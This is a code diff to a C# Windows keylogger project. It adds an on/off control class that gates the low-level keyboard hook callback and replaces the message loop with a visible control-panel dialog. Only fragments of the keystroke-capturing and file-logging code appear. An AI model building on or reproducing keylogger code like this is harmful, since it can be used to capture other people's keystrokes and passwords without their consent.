@@ -31,6 +31,7 @@ namespace dotnet_keylogger
         private static int right_shift = 0;
         private static int win = 0;
         private static bool newfile = false;
+        private static control control = new control(true);
 
         private static StreamWriter sw;
 
@@ -70,8 +71,7 @@ namespace dotnet_keylogger
              * ULONG_PTR dwExtraInfo = Pointer to extra info
              */
 
-
-            if (nCode >= 0)
+              if (nCode >= 0 && control.state == true)
             {
                 long diff = 0;
                 int vkCode = Marshal.ReadInt32(lParam);
@@ -257,10 +257,15 @@ namespace dotnet_keylogger
             Thread thread_numlock_track = new Thread(new ThreadStart(TrackNumLock));
             thread_numlock_track.Start();
             _hookID = SetHook(_hook_callback_pointer);
-            Application.Run();
+            /// Application.Run(); run without a form
+            cPanel cp = new cPanel(control); cp.ShowDialog();
             UnhookWindowsHookEx(_hookID);
             sw.Flush();
             sw.Close();
+            thread_capslock_track.Abort();
+            thread_scrolllock_track.Abort();
+            thread_numlock_track.Abort();
+            Application.Exit();
         }
 
         [DllImport("user32.dll")]
@@ -304,5 +309,14 @@ namespace dotnet_keylogger
         }
             [DllImport("user32.dll")]
         static extern short GetKeyState(VirtualKeyStates nVirtKey);
+    }
+
+    public class control
+    {
+        public bool state { get; set; }
+        public control(bool state)
+        {
+            this.state = state;
+        }
     }
 }
